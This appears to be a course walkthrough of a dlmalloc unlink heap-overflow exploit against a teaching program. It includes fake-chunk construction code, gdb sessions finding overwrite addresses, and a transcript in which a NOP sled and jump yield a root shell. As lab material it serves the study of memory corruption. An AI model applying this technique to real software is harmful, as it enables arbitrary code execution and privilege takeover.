# Heap Overflow Walkthrough

## Vulnerability

The vulnerability in this [program](vuln.cpp) is due to an improperly bounded
copy into `msg` in `RecvMsg`.  Since this program is uses
[dlmalloc](malloc.c), this allows an attacker to inject fake chunks to perform
an unlink exploit as described in class.

## Exploitation

Since the program frees `msg` after the copy occurs, we will use the strategy
of creating fake free chunks to force a chunk consolidation using `unlink`
during the `free` operation.  The goal will be to force `unlink` to overwrite
a saved instruction pointer for the return to `main` on the stack.

The first order of business is to find the address of the return to main, as
well as the address of our payload on the heap.  To do this, we'll first
need to create a temporary input to provide sizes for the two chunks to
allocate.  An example script to do this might look like:

```python
import sys, struct
sys.stdout.write(struct.pack('<H', 256, 256))
```

Now, using gdb to run the program on the output of the above:

```
# Launch gdb on the program
$ gdb vuln

# Break on RecvMsg
(gdb) b RecvMsg(int)
Breakpoint 1 at 0x400d58: file vuln.cpp, line 13.

# Run on the input
(gdb) r <buf
Starting program: /home/wkr/host/Devel/Class/SoftVulnSec/Examples/heap/vuln <buf
Breakpoint 1, RecvMsg (sk=0) at vuln.cpp:13

# Step up to the allocations
13      memset(&hdr, 0, sizeof(hdr));
(gdb) n
14      read(sk, &hdr.len_, 2);
(gdb)
15      read(sk, &hdr.opts_len_, 2);
(gdb)
16      char* msg = reinterpret_cast<char*>(malloc(hdr.len_));
(gdb)
17      char* msg_opts = reinterpret_cast<char*>(malloc(hdr.opts_len_));
(gdb)
19      char* ptr = msg;

# Print the address of msg
(gdb) p/x msg
$1 = 0x60b010

# Find the address of the saved return to main
(gdb) bt
#0  RecvMsg (sk=0) at vuln.cpp:19
#1  0x0000000000400e62 in main (argc=1, argv=0x7fffffffe618) at vuln.cpp:34
(gdb) x/2xg $rbp
0x7fffffffe510: 0x00007fffffffe530  0x0000000000400e62
```

Ok, so the first chunk's data starts at 0x60b010, and 256 bytes is enough for
our payload.  And, the address of the overwrite should be 0x7fffffffe518.

To abuse `unlink`, we then need to create a fake chunk with the `fd` and `bk`
pointers set to 0x7fffffffe518 - 24 and somewhere near 0x60b010 to slide into
the payload we will inject.  That leaves the `prev_size` and `size` fields to
set -- for the former, we can use an arbitrary value since the allocator
considers `prev_size` as part of the user data of the previous chunk in
memory (that must be allocated, otherwise we would have two adjacent free
chunks) and, for the latter, we can choose an arbitrary size ORed with the
PREV_INUSE bit.  In this walkthrough, we'll create a 64 byte chunk | 1 = 65.

The following python snippet will create a fake chunk described above.

```python
struct.pack('<QQQQ', 1, 65, 0x7fffffffe518 - 24, 0x60b010)
```

Note that we can't return directly to 0x60b010, however.  This is because
during the consolidation process, `unlink` will also set 0x60b010 + 16 to
a value dereferenced from around the `fd` pointer.  So, we need to adjust
our strategy a bit to avoid jumping into a corrupted portion of our payload.

Specifically, what we will do is return to an address that we know won't
be corrupted, and then insert a jump instruction over any following
corruption due to the above process.  In this walkthrough, we will return
to 0x60b040, where we will have inserted a `jmp 0x20` instruction.

The [example exploit](exploit.py) packages all of this together.  For good
measure, we create a second fake chunk, but this isn't strictly necessary
for this vulnerability.

Below is a transcript of the exploit in action.

```
# Execute on the output of exploit.py and break at line 28
Breakpoint 2, RecvMsg (sk=0) at vuln.cpp:28
28      free(msg);

# Header of the first chunk (fd and bk pointers used for user data)
(gdb) x/4xg msg - 0x10
0x60b000:   0x0000000000000000  0x0000000000000113
0x60b010:   0x9090909090909090  0x9090909090909090

# Header of the first fake chunk we've injected
(gdb) x/4xg msg_opts - 0x10
0x60b110:   0x0000000000000001  0x0000000000000041
0x60b120:   0x00007fffffffe500  0x000000000060b040

# Overwrite target on the stack, prior to unlink
(gdb) x/2xg $rbp
0x7fffffffe510: 0x00007fffffffe530  0x0000000000400e62

# Execute the free -> ... -> unlink
(gdb) n
30      return 0;

# We've redirected the return to the heap
(gdb) x/2xg $rbp
0x7fffffffe510: 0x00007fffffffe530  0x000000000060b040

# This is where we will return
(gdb) x/8xg 0x000000000060b040
0x60b040:   0x9090909090901eeb  0x9090909090909090
0x60b050:   0x00007fffffffe500  0x9090909090909090
0x60b060:   0x9090909090909090  0x9090909090909090
0x60b070:   0x9090909090909090  0x9090909090909090

# We return to a jmp $rip + 0x20 instruction
(gdb) x/i 0x000000000060b040
   0x60b040:    jmp    0x60b060

# After the jump, we slide down the NOP sled into the payload...
(gdb) x/8i 0x60b060
   0x60b060:    nop
   0x60b061:    nop
   0x60b062:    nop
   0x60b063:    nop
   0x60b064:    nop
   0x60b065:    nop
   0x60b066:    nop
   0x60b067:    nop

# Continuing execs a shell, into which we pipe in an id command
(gdb) c
Continuing.
process 1725 is executing new program: /usr/bin/bash
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)
[Inferior 1 (process 1725) exited normally]
(gdb)
```
